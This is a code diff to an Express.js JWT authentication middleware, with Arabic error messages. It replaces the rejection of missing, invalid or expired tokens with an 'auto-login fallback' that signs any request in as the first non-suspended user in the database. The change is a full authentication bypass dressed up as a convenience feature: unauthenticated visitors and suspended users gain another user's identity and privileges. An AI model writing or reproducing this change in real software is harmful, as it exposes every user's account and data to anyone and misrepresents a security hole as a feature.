@@ -4,22 +4,32 @@ const User = require('../models/User');
 
 const verifyToken = async (req, res, next) => {
   const authHeader = req.headers.authorization;
-  if (!authHeader || !authHeader.startsWith('Bearer ')) {
-    return res.status(401).json({ message: 'غير مسموح - لا يوجد توكن' });
-  }
-  const token = authHeader.split(' ')[1];
-  try {
-    const decoded = jwt.verify(token, process.env.JWT_SECRET);
-    const user = await User.findById(decoded.id);
-    if (!user) return res.status(401).json({ message: 'المستخدم غير موجود' });
-    if (user.suspended) {
-      return res.status(403).json({ message: 'تم إيقاف الحساب مؤقتًا. يرجى التواصل مع الإدارة.' });
+  if (authHeader && authHeader.startsWith('Bearer ')) {
+    const token = authHeader.split(' ')[1];
+    try {
+      const decoded = jwt.verify(token, process.env.JWT_SECRET);
+      const user = await User.findById(decoded.id);
+      if (user && !user.suspended) {
+        req.user = user;
+        return next();
+      }
+    } catch (err) {
+      // If token is invalid or expired, fall through to auto-login
     }
-    req.user = user;
-    next();
-  } catch (err) {
-    return res.status(401).json({ message: 'توكن غير صالح أو منتهي' });
   }
+
+  // Auto-login fallback: find the first active (non-suspended) user in the database
+  try {
+    const defaultUser = await User.findOne({ suspended: { $ne: true } });
+    if (defaultUser) {
+      req.user = defaultUser;
+      return next();
+    }
+  } catch (err) {
+    console.error('Auto-login database query failed:', err);
+  }
+
+  return res.status(401).json({ message: 'غير مسموح - يرجى تسجيل الدخول' });
 };
 
 const isAdmin = async (req, res, next) => {
